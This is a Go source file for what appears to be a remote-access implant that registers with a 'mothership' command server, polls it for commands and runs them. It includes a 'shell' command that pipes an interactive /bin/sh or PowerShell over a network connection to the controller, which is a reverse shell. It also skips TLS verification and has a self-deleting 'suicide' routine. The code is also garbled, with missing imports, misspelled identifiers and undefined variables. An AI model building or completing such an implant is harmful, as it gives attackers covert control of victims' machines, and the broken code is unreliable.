package agent

import(
  "os"
  "log"
  "time"
  "os/exec"
  "runtime"
  "crypto/tls"
  "crypto/x509"
  "odin/lib/penguins/zoo"
)

type ImplantWrapper struct{
  Address string
  MothershipID string
  MotherShips []string
  Encoder  *gob.Encoder
	Decoder  *gob.Decoder
  Tls bool
  RootPem []byte
}

func (iw *ImplantWrapper) RunAgent(){
  //create a http/https cient
  var (
    err error
    url string
    client *http.Client
    requestBody bytes.Buffer
  )
  client = new(http.Client)
  if iw.Tls {
    client = &http.CLient{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
    url = fmt.Sprintf("https://%s",iw.Address)
  } else {
    client = &http.Client{}
    url = fmt.Sprintf("http://%s",iw.Address)
  }
  go func(){
    iw.Encoder = gob.NewEncoder(&requestBody)
    iw.Decoder = gob.NewDecoder(&requestBody)
  }()
  //register
  type Data struct{
    Body interface{}
  }
  work := &Data{ Body: im.MotherShipID, }
  if err = iw.Encoder.Encode(work); err != nil{
    fmt.Println("Error ecoding request: ",err);return
  }
  req,err := http.NewRequest("POST",url,&requestBody)
  if err != nil{
    log.Println(err);return
  }
  utils.ClientAddHeaderVal(req,"Register","")
  resp,err := client.Do(req)
  if err != nil{
    fmt.Println("Error sending request: ",err);return
  }
  cookie := resp.Body.Heder.Get("Coockie")
  resp.Body.Close();time.Sleep(5 * time.Second)
  START:
  // get work
  work = &Data{Body: &core.Work{UserId:cookie},}
  if err = iw.Encoder.Encode(work); err != nil{
    fmt.Println("Error ecoding request: ",err);return
  }
  if req,err = http.NewRequest("GET",url+"/?data=getwork",work); err != nil{
    fmt.Println("Error getting work: ",err);goto START
  }
  resp,err := client.Do(req)
  if err != nil{
    fmt.Println("Error sending request: ",err);return
  }
  // switch the work
  if err = iw.Decode(resp.Body); err != nil{
    fmt.Println("Error Decoding resp: ",err);goto START
  }
  resp.Body.Close()
  switch work.CmdIn {
  case "":
    time.Sleep(5 * time.Second)
    goto START
  case "No Work.":
    time.Sleep(5 * time.Second)
    goto START
  case "getos":
    output = runtime.GOOS
    work.CmdOut += output
    iw.SendOutput(cmd)
    goto START
  case "upload":
  case "download":
  case "shell":
    var conn net.Conn
    if iw.Tls{
      roots := x509.NewCertPool()
      ok := roots.AppendCertsFromPEM(iw.RootPem)
      if !ok {
        log.Println("Error appending cert to pool")
        return
      }
      conn,err := tls.Dial("tcp",ic.Address, &tls.Config{
        RootCAs: roots,
      })
      if err != nil{
        log.Println(err);goto START
      }
    } else {
      conn,err = net.Dial(w,wc.Address)
      if err != nil{
        log.Println(err);goto START
      }
    }
    conn := net.Dial
    Interactive(conn)
  case "suicide":
    output = "Initiating kill chain..........."
    work.CmdOut += output
    iw.SendOutput(ctx,cmd)
    _ = os.Remove(os.Args[0])
    os.Exit(0)
  default:
    work.Out += output
    iw.SendOutput(ctx,work)
    goto START
  }
}

func Interactive(conn net.Conn){
  rp, wp := io.Pipe()
  var cmd *exec.Cmd
  if runtime.GOOS == "windows"{
    cmd = exec.Command("powershell.exe")
  } else {
    cmd = exec.Command("/bin/sh","-i")
  }
  zoo.CommandExecuter(cmd)
  cmd.Stdin = conn
  cmd.Stdout = wp
  go io.Copy(conn,rp)
  cmd.Run()
}
